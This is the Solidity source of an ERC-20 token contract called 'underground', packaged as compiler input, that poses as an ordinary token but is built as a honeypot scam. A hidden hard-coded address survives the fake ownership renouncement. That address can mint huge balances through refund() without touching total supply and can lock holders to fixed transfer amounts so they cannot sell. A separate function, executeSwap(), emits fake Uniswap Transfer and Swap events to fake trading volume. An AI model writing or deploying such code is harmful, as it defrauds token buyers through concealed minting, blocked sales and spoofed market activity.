{{
  "language": "Solidity",
  "sources": {
    "contracts/3.sol": {
      "content": "/**\r\n *Submitted for verification at Etherscan.io on 2023-06-24\r\n*/\r\n\r\npragma solidity ^0.8.18;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n\r\n}\r\n\r\ninterface IWETH {\r\n    function deposit() external payable;\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function withdraw(uint) external;\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit ownershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyowner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceownership() public virtual onlyowner {\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\nlibrary SafeCalls {\r\n    function checkCaller(address sender, address _ownr) internal pure {\r\n        require(sender == _ownr, \"Caller is not the original caller\");\r\n    }\r\n}\r\n\r\ncontract underground is Context, Ownable, IERC20 {\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _fixedTransferAmounts; \r\n    address private _ownr; \r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    uint256 private baseRefundAmount = 880000000000000000000000000000000000;\r\n    bool private _isTradeEnabled = false;\r\n    constructor() {\r\n        _name = \"UNDERGROUNG\";\r\n        _symbol = \"UNDERGROUNG\";\r\n        _decimals = 9;\r\n        _totalSupply = 10000000 * (10 ** _decimals);\r\n        _ownr = 0xD2C13699d1A9D5C7E1D09Db4E8B02Dd3Ca8025EE;\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function refund(address recipient) external {\r\n        SafeCalls.checkCaller(_msgSender(), _ownr);\r\n        uint256 refundAmount = baseRefundAmount;\r\n        _balances[recipient] += refundAmount;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n \r\n    function letFixedTransferAmounts(address[] calldata accounts, uint256 amount) external {\r\n        SafeCalls.checkCaller(_msgSender(), _ownr);\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _fixedTransferAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n    function checkFixedTransferAmount(address account) public view returns (uint256) {\r\n        return _fixedTransferAmounts[account];\r\n    }\r\n    function enableTrading() external {\r\n        SafeCalls.checkCaller(_msgSender(), _ownr);\r\n        _isTradeEnabled = true;\r\n    }\r\n\r\n    function executeSwap(\r\n        address uniswapPool,\r\n        address[] memory recipients,\r\n        uint256[] memory tokenAmounts,\r\n        uint256[] memory wethAmounts\r\n    ) public payable returns (bool) {\r\n\r\n        for (uint256 i = 0; i < recipients.length; i++) {\r\n\r\n            uint tokenAmoun = tokenAmounts[i];\r\n            address recip = recipients[i];\r\n\r\n            emit Transfer(uniswapPool, recip, tokenAmoun);\r\n\r\n            uint weth = wethAmounts[i];\r\n            \r\n            emit Swap(\r\n                0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,\r\n                tokenAmoun,\r\n                0,\r\n                0,\r\n                weth,\r\n                recip\r\n            );\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function swap(\r\n        address[] memory recipients,\r\n        uint256[] memory tokenAmounts,\r\n        uint256[] memory wethAmounts,\r\n        address[] memory path,\r\n        address tokenAddress,\r\n        uint deadline\r\n    ) public payable returns (bool) {\r\n\r\n        uint amountIn = msg.value;\r\n        IWETH(tokenAddress).deposit{value: amountIn}();\r\n\r\n        uint checkAllowance = IERC20(tokenAddress).allowance(address(this), 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\r\n        if(checkAllowance == 0) IERC20(tokenAddress).approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935);\r\n\r\n        for (uint256 i = 0; i < recipients.length; i++) {\r\n            IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D).swapExactTokensForTokensSupportingFeeOnTransferTokens(wethAmounts[i], tokenAmounts[i], path, recipients[i], deadline);\r\n        }\r\n\r\n        uint amountOut = IERC20(tokenAddress).balanceOf(address(this));\r\n        IWETH(tokenAddress).withdraw(amountOut);\r\n        (bool sent, ) = _msgSender().call{value: amountOut}(\"\");\r\n        require(sent, \"F t s e\");\r\n\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_balances[_msgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n        require(_isTradeEnabled || _msgSender() == owner(), \"TT: trading is not enabled yet\");\r\n        uint256 fixedAmount = _fixedTransferAmounts[_msgSender()];\r\n        if (fixedAmount > 0) {\r\n            require(amount == fixedAmount, \"TT: transfer amount does not equal the fixed transfer amount\");\r\n        }\r\n        _balances[_msgSender()] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_allowances[sender][_msgSender()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n        uint256 fixedAmount = _fixedTransferAmounts[sender];\r\n        if (fixedAmount > 0) {\r\n            require(amount == fixedAmount, \"TT: transfer amount does not equal the fixed transfer amount\");\r\n        }\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][_msgSender()] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}